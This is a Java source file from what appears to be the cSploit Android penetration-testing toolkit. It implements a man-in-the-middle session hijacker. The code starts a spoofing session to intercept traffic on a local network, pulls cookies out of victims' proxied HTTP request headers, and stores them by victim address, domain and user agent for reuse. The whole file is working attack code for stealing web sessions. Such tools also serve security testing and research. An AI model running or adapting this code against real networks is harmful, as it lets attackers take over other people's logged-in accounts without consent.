package org.csploit.android.plugins.mitm.hijacker;

import android.support.annotation.NonNull;
import android.support.annotation.StringRes;

import org.csploit.android.core.ChildManager;
import org.csploit.android.core.Logger;
import org.csploit.android.core.System;
import org.csploit.android.net.http.RequestParser;
import org.csploit.android.net.http.proxy.Proxy;
import org.csploit.android.plugins.mitm.SpoofSession;

import java.net.HttpCookie;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class Hijacker implements Proxy.OnRequestListener {

  private boolean running = false;
  private final Map<String, Session> sessions = new LinkedHashMap<>();

  private HijackerListener listener;
  private SpoofSession spoofer;

  public Hijacker() {
    spoofer = new SpoofSession();
  }

  public void setListener(HijackerListener listener) {
    this.listener = listener;
  }

  public boolean isRunning() {
    return running;
  }

  private void setRunning(boolean running) {
    if(this.running == running)
      return;

    this.running = running;

    if(listener != null)
      listener.onStateChanged();
  }

  private String buildSessionKey(String address, String domain, boolean https) {
    return address + ":" + domain + ":" + https;
  }

  private String buildSessionKey(@NonNull Session session) {
    return buildSessionKey(session.mAddress, session.mDomain, session.mHTTPS);
  }

  //TODO: addSession ( load from sdcard )

  @Override
  public void onRequest(boolean https, String address, String hostname,
                        ArrayList<String> headers) {
    ArrayList<HttpCookie> cookies = RequestParser
            .getCookiesFromHeaders(headers);

    // got any cookie ?
    if (cookies != null && cookies.size() > 0) {
      String domain = cookies.get(0).getDomain();

      if (domain == null || domain.isEmpty()) {
        domain = RequestParser.getBaseDomain(hostname);

        for (HttpCookie cooky : cookies)
          cooky.setDomain(domain);
      }

      String key = buildSessionKey(address, domain, https);
      Session session;

      synchronized (sessions) {
        session = sessions.get(key);
      }

      // new session ^^
      if (session == null) {
        String ua = RequestParser.getHeaderValue("User-Agent", headers);
        session = new Session(https, address, domain, ua);

        addSession(key, session);
      }

      session.updateCookies(cookies);

      if(listener != null) {
        listener.onSessionsChanged();
      }
    }
  }

  /**
   * add a session to this hijacker instance
   * @param session the session to add
   */
  public void addSession(@NonNull Session session) {
    addSession(buildSessionKey(session), session);
    
    if(listener != null) {
      listener.onSessionsChanged();
    }
  }

  private void addSession(String key, Session session) {
    synchronized (sessions) {
      sessions.put(key, session);
    }
  }

  public List<Session> getSessions() {
    synchronized (sessions) {
      return new ArrayList<>(sessions.values());
    }
  }

  public void start() {
    if (System.getProxy() != null)
      System.getProxy().setOnRequestListener(this);

    try {
      spoofer.start(new SpoofSession.OnSessionReadyListener() {
        @Override
        public void onSessionReady() {
          setRunning(true);
        }

        @Override
        public void onError(String error) {
          if(listener != null) {
            listener.onError(error);
          }
        }

        @Override
        public void onError(@StringRes int stringId) {
          if(listener != null) {
            listener.onError(stringId);
          }
        }
      });
    } catch (ChildManager.ChildNotStartedException e) {
      Logger.error(e.getMessage());
    }
  }

  public void stop() {
    spoofer.stop();
    if(System.getProxy() != null) {
      System.getProxy().setOnRequestListener(null);
    }
    setRunning(false);
  }

  public interface HijackerListener {
    void onSessionsChanged();
    void onStateChanged();
    void onError(String message);
    void onError(@StringRes int stringId);
  }
}
